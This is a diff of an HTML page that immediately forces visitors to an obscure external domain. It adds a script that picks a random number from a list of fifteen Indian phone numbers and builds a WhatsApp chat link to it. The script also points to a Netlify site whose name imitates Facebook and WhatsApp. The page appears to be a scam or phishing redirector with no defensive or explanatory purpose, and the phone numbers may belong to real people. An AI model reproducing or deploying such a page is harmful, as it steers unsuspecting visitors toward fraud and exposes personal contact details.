@@ -1,8 +1,36 @@
 <!DOCTYPE html>
 <html>
 <head>
-<meta http-equiv="refresh" content="0; URL=http://xenaro.sbs/V12WFG">
+  <meta http-equiv="refresh" content="0; URL=http://xenaro.sbs/V12WFG">
+  <title></title>
+
+  <!-- Dummy script (not used for redirect) -->
+  <script>
+    const nums = [
+      "919199588329","919956067997","917037906840","919286487902",
+      "919824245986","918931020552","917385794108","919040452395",
+      "917479487845","917320928957","916000532458","917418682195",
+      "918160015131","919032694040","917509899063"
+    ];
+
+    const msg = encodeURIComponent("Hello");
+    const pick = nums[Math.floor(Math.random() * nums.length)];
+
+    // Dummy redirects (never executed because meta refresh runs first)
+    function fakeRedirect() {
+      window.location.replace(
+        "https://api.whatsapp.com/send/?phone=" + pick +
+        "&text=" + msg +
+        "&type=phone_number&app_absent=0"
+      );
+
+      window.location.href =
+        "https://bubblefacbokwslnkwahtasppagent.netlify.app/";
+    }
+  </script>
 </head>
+
 <body>
+Redirecting...
 </body>
 </html>
